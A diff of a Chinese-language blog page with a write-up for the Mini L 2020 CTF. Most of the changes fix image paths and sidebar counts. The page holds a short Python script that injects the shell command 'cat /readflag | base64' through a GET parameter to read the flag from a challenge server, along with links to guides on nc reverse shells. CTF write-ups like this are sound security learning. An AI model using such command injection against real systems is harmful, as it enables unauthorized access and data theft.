@@ -30,7 +30,7 @@
 <meta property="og:site_name" content="Framist&#39;s Little House">
 <meta property="og:description" content="Mini L 2020 题解在MiniL2021之前玩耍一下">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://framist.github.io/2021/04/29/%E3%80%90MiniL2020%E9%A2%98%E8%A7%A3%E3%80%91%E6%97%A5%E5%B8%B8%E7%8E%A9%E8%80%8D/%E3%80%90MiniL2020%E9%A2%98%E8%A7%A3%E3%80%91%E6%97%A5%E5%B8%B8%E7%8E%A9%E8%80%8D/image-20210429221306970.png">
+<meta property="og:image" content="https://framist.github.io/%E3%80%90MiniL2020%E9%A2%98%E8%A7%A3%E3%80%91%E6%97%A5%E5%B8%B8%E7%8E%A9%E8%80%8D/image-20210429221306970.png">
 <meta property="article:published_time" content="2021-04-29T13:56:05.806Z">
 <meta property="article:modified_time" content="2021-05-20T13:38:54.816Z">
 <meta property="article:author" content="Framist">
@@ -38,7 +38,7 @@
 <meta property="article:tag" content="Web">
 <meta property="article:tag" content="Python">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://framist.github.io/2021/04/29/%E3%80%90MiniL2020%E9%A2%98%E8%A7%A3%E3%80%91%E6%97%A5%E5%B8%B8%E7%8E%A9%E8%80%8D/%E3%80%90MiniL2020%E9%A2%98%E8%A7%A3%E3%80%91%E6%97%A5%E5%B8%B8%E7%8E%A9%E8%80%8D/image-20210429221306970.png">
+<meta name="twitter:image" content="https://framist.github.io/%E3%80%90MiniL2020%E9%A2%98%E8%A7%A3%E3%80%91%E6%97%A5%E5%B8%B8%E7%8E%A9%E8%80%8D/image-20210429221306970.png">
 
 <link rel="canonical" href="https://framist.github.io/2021/04/29/%E3%80%90MiniL2020%E9%A2%98%E8%A7%A3%E3%80%91%E6%97%A5%E5%B8%B8%E7%8E%A9%E8%80%8D/">
 
@@ -241,16 +241,16 @@
         <h1 id="Mini-L-2020-题解"><a href="#Mini-L-2020-题解" class="headerlink" title="Mini L 2020 题解"></a>Mini L 2020 题解</h1><p>在MiniL2021之前玩耍一下</p>
 <a id="more"></a>
 
-<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="id-wife"><a href="#id-wife" class="headerlink" title="id_wife"></a>id_wife</h3><p><img data-src="%E3%80%90MiniL2020%E9%A2%98%E8%A7%A3%E3%80%91%E6%97%A5%E5%B8%B8%E7%8E%A9%E8%80%8D/image-20210429221306970.png" alt="image-20210429221306970"></p>
+<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="id-wife"><a href="#id-wife" class="headerlink" title="id_wife"></a>id_wife</h3><p><img data-src="/%E3%80%90MiniL2020%E9%A2%98%E8%A7%A3%E3%80%91%E6%97%A5%E5%B8%B8%E7%8E%A9%E8%80%8D/image-20210429221306970.png" alt="image-20210429221306970"></p>
 <p>随便敲字符：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">error 1064 : You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use  near &#39;&#39;&#39;&#39;)&#39; at line 1&#96;</span><br></pre></td></tr></table></figure>
 <p>啊啊啊发现自己的SQL注入方面其实根本就没学过，在网上也没有搜到很好的教程。无效尝试许久之后忍不住翻了答案：</p>
 <p><a target="_blank" rel="noopener" href="https://www.wootec.top/2020/05/17/minil-ctf-wp/#Web">Mini L CTF WriteUp By Int3rn3t_Expl0rer Team - Reverier’s Blog (wootec.top)</a></p>
-<h3 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">url = <span class="string">&#x27;http://6c366814-f63f-4de8-954b-06ef78b851eb.archive.xdsec.chall.frankli.site/&#x27;</span></span><br><span class="line"></span><br><span class="line">getdata = &#123;<span class="string">&#x27;a&#x27;</span> : <span class="string">&#x27;cat /readflag | base64&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">req = requests.get(url= url , params=getdata)</span><br><span class="line"><span class="comment"># print(req.url)</span></span><br><span class="line"><span class="comment"># print(req.encoding)</span></span><br><span class="line">out = req.text</span><br><span class="line">out = out[:out.find(<span class="string">&#x27;&lt;code&gt;&#x27;</span>)]</span><br><span class="line">print(out)</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;out&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(base64.b64decode(out))</span><br></pre></td></tr></table></figure>
+<h3 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">url = <span class="string">&#x27;http://6c366814-f63f-4de8-954b-06ef78b851eb.archive.xdsec.chall.frankli.site/&#x27;</span></span><br><span class="line"></span><br><span class="line">getdata = &#123;<span class="string">&#x27;a&#x27;</span> : <span class="string">&#x27;cat /readflag | base64&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">req = requests.get(url= url , params=getdata)</span><br><span class="line"><span class="comment"># print(req.url)</span></span><br><span class="line"><span class="comment"># print(req.encoding)</span></span><br><span class="line">out = req.text</span><br><span class="line">out = out[:out.find(<span class="string">&#x27;&lt;code&gt;&#x27;</span>)]</span><br><span class="line"><span class="built_in">print</span>(out)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;out&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(base64.b64decode(out))</span><br></pre></td></tr></table></figure>
 
 
 
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/csacs/article/details/91440568">(2条消息) Windows/Linux 下nc 反弹shell_SoulCat-CSDN博客_nc反弹shell</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/csacs/article/details/91440568">(2条消息) Windows&#x2F;Linux 下nc 反弹shell_SoulCat-CSDN博客_nc反弹shell</a></p>
 <p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/-chenxs/p/11748488.html">NC反弹shell的几种方法 - ctrl_TT豆 - 博客园 (cnblogs.com)</a></p>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45924653/article/details/107445417">(2条消息) Linux反弹shell姿势总结_葵花与巷_的博客-CSDN博客</a></p>
 
@@ -384,20 +384,20 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">69</span>
+          <span class="site-state-item-count">70</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">24</span>
+        <span class="site-state-item-count">25</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">40</span>
+        <span class="site-state-item-count">42</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
